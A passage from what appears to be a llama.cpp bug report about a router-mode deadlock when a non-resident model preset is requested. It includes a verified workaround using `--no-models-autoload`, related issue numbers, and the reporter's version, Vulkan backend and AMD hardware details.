times immediately after a request for the non-resident preset. `resource deadlock would occur` is
the C++ runtime's `resource_deadlock_would_occur`, thrown when a thread tries to join itself, so
this looks like the child shutdown/join path in the router.

**Workaround (verified).** Launch with `--no-models-autoload`. The startup preset still loads via
`load-on-startup = true`, and the same non-resident request now returns immediately:

```
HTTP 400 {"error":{"code":400,"message":"model is not loaded","type":"invalid_request_error"}}   (0.0 s)
```

with the router staying healthy afterwards (resident-model chat 200 before *and* after, `/health`
and `/v1/models` 200 instant, nothing evicted). The trade-off is that runtime preset switching is
unavailable — on a 6 GB card only one model fits anyway.

### Related issues

- #28698 — same trigger path: `tick()` (added for #28443) evicts a model that is being requested.
  Reported on Linux/HIP with a *different* symptom (per-request `http client error: Could not
  establish connection`, server keeps limping). The reporter notes PR #28555 does **not** fix it.
  The present report may be the same root cause with a worse outcome (permanent deadlock instead of
  failed requests).
- #28774 — router scheduler race during concurrent cold-start with `--models-max 1`.
- #20763 — earlier router-mode deadlock fix on child crash; this looks like a different path.

### Log output

The incidents predate adding `--log-file` to the launcher, so there is no router log for the two
wedged runs — the HTTP evidence in the table above is what I captured (timings measured with a
Python client on 127.0.0.1, no other load on the machine). I can reproduce it with `-lv 4
--log-file` and attach a full log if that would help.

### Name and Version

❯ llama-cli --version
version: 0.5.0-dev (build 11399, commit 2ca15f540)
built with GNU 16.2.1 for Linux x86_64


### Operating systems

Linux

### GGML backends

Vulkan

### Hardware

AMD Ryzen 9 9950X
GPU 1: AMD Radeon RX 7900 XTX [Vulkan1] Used for inference.
GPU 2: AMD Radeon RX 9070 XT [Vulkan0] - Not used for inference.
GPU 3: AMD Radeon Graphics [Vulkan2] - Not used for inference.


### Models

[Unsloth Qwen3.8-27B-UD-IQ4_XS](https://huggingface.co/unsloth/Qwen3.8-27B-GGUF?show_file_info=Qwen3.8-27B-UD-IQ4_XS.gguf)
